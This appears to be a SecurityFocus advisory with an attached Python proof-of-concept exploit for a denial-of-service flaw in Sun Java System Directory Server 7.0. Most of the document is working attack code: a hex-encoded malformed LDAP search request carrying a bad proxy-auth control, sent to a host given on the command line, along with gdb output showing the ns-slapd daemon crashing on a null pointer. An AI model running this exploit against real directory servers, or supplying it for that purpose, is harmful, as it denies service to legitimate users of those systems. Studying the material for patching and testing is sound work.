source: http://www.securityfocus.com/bid/37699/info

Sun Java System Directory Server is prone to a denial-of-service vulnerability.

An attacker can exploit this issue to crash the effected application, denying service to legitimate users.

Directory Server 7.0 is vulnerable; other versions may also be affected. 

#!/usr/bin/env python
# sun_dsee7.py
#
# Use this code at your own risk. Never run it against a production system.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import socket
import sys

"""
Sun Directory Server 7.0 core_get_proxyauth_dn() DoS (null ptr dereference)
Tested on SUSE Linux Enterprise Server 11 

# dsadm -V
[dsadm]
dsadm               : 7.0                  B2009.1104.2350 ZIP

Copyright 2009 Sun Microsystems, Inc. All Rights Reserved.
SUN PROPRIETARY/CONFIDENTIAL.
Use is subject to license terms.

[slapd 32-bit]
Sun Microsystems, Inc.
Sun-Directory-Server/7.0 B2009.1104.2350 32-bit
ns-slapd            : 7.0                  B2009.1104.2350 ZIP
Slapd Library       : 7.0                  B2009.1104.2350
Front-End Library   : 7.0                  B2009.1104.2350

This simple proof of concept code will crash ns-slapd daemon:

Attaching to process 10204
Reading symbols from /opt/sun/dsee7/lib/ns-slapd...(no debugging symbols found)...done.
Reading symbols from /lib/libpthread.so.0...(no debugging symbols found)...done.
...
Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xb1b47b90 (LWP 10233)]
0xb80098c4 in core_get_proxyauth_dn () from /opt/sun/dsee7/lib/libslapd.so
(gdb) bt
#0  0xb80098c4 in core_get_proxyauth_dn () from /opt/sun/dsee7/lib/libslapd.so
#1  0xb7ff30d3 in common_core_set_pb () from /opt/sun/dsee7/lib/libslapd.so
#2  0xb7f1c7eb in search_core_set_pb () from /opt/sun/dsee7/lib/libfe.so
#3  0xb7f2667f in ldap_decode_search () from /opt/sun/dsee7/lib/libfe.so
#4  0xb7f27993 in ldap_parse_request () from /opt/sun/dsee7/lib/libfe.so
#5  0xb7f147a4 in process_ldap_operation_using_core_api () from /opt/sun/dsee7/lib/libfe.so
#6  0xb7f149ba in ldap_frontend_main_using_core_api () from /opt/sun/dsee7/lib/libfe.so
#7  0xb7f153e3 in generic_workerthreadmain () from /opt/sun/dsee7/lib/libfe.so
#8  0xb7eec89e in _pt_root () from /opt/sun/dsee7/lib/../lib/private/libnspr4.so
#9  0xb80481b5 in start_thread () from /lib/libpthread.so.0
#10 0xb7ccb3be in clone () from /lib/libc.so.6
(gdb) x/i $eip
0xb80098c4 :	cmpb   $0x4,(%eax)
(gdb) i r eax
eax            0x0	0
(gdb) 

"""

def send_req(host,port):
	"""
LDAP Message, Search Request
        Message Id: 1
        Message Type: Search Request (0x03)
        Message Length: 270
        Base DN: (null)
        Scope: Subtree (0x02)
        Dereference: Never (0x00)
        Size Limit: 0
        Time Limit: 0
        Attributes Only: False
        Filter: (objectClass=*)
        Attribute: (null)
        LDAP Controls
            LDAP Control
                Control OID: 2.16.840.1.113730.3.4.18
                Control Critical: True
            ERROR: Couldn't parse LDAP Control: Wrong type for that item
        """

       	reqdump="""
	30 82 01 15 02 01 01 63 82 01 0e 04 00 0a 01 02
        0a 01 00 02 01 00 02 01 00 01 01 00 87 0b 6f 62
        6a 65 63 74 43 6c 61 73 73 30 02 04 00 a0 81 e9
        30 81 e6 04 18 32 2e 31 36 2e 38 34 30 2e 31 2e
        31 31 33 37 33 30 2e 33 2e 34 2e 31 38 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
        01 01 01 01 01 01 00 04 00
	"""

	buf = ""
	for i in filter(lambda x: len(x.strip())>0, reqdump.split(" ")):
		buf+=chr(int(i,16))

	print "Sending req to %s:%d" % (host,port)

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
	sock.sendall(buf)
	sock.close()

	print "Done"

if __name__=="__main__":
	if len(sys.argv)<3:
		print "usage: %s host port" % sys.argv[0]
		sys.exit()

	send_req(sys.argv[1],int(sys.argv[2]))
